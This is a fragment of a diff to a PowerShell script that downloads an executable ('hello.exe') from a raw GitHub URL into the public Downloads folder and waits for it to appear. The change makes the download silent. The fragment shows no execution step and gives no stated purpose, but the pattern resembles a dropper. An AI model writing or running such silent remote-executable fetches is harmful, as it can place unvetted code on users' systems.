@@ -1,6 +1,6 @@
 $downloadUrl = "https://raw.githubusercontent.com/Eric970619/page/main/hello.exe"
 $destinationPath = "C:\Users\Public\Downloads\hello.exe"
-
+$ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
 
 while (-not (Test-Path $destinationPath)) {
